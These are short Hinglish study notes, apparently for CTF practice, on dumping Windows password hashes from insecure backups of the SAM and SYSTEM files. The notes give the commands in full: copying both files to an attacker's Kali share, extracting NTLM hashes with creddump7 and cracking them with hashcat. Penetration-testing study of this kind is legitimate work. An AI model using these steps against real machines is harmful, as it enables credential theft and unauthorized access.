**Passwords — SAM (Security Account Manager)**

---

**Concept — Ye hota kya hai?**

Windows saare local users ke passwords ek file mein store karta hai — **SAM file.**

Lekin plaintext nahi — **NTLM hash** form mein.

SAM file akele kaam nahi karti — **SYSTEM file** usse decrypt karti hai. Dono saath chahiye hashes nikalne ke liye.

---

**Prerequisite — Normal case mein:**

SAM aur SYSTEM files **sirf SYSTEM/Admin** read kar sakta hai — normal user touch nahi kar sakta.

```
C:\Windows\System32\config\SAM     ← locked, admin only
C:\Windows\System32\config\SYSTEM  ← locked, admin only
```

---

**Vulnerability — Galat kya hua?**

Admin ne **insecure backup** bana diya:

```
C:\Windows\Repair\SAM     ← accessible!
C:\Windows\Repair\SYSTEM  ← accessible!
```

Backup pe same restrictions nahi lagayi — normal user bhi read kar sakta hai.

---

**General Commands — Kisi bhi CTF machine pe:**

**1. Backup files dhundho**

cmd

```cmd
dir C:\Windows\Repair\
dir C:\Windows\System32\config\
```

**2. Kali pe transfer karo**

cmd

```cmd
copy C:\Windows\Repair\SAM \\<kali-ip>\share\
copy C:\Windows\Repair\SYSTEM \\<kali-ip>\share\
```

**3. Hashes dump karo**

bash

```bash
python3 creddump7/pwdump.py SYSTEM SAM
```

**4. Hash crack karo**

bash

```bash
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
```

---

**Mental Model:**

```
SAM backup accessible hai?
        ↓
SYSTEM file bhi le lo
        ↓
Dono se hashes nikalo
        ↓
Hashcat se crack karo → plaintext password
```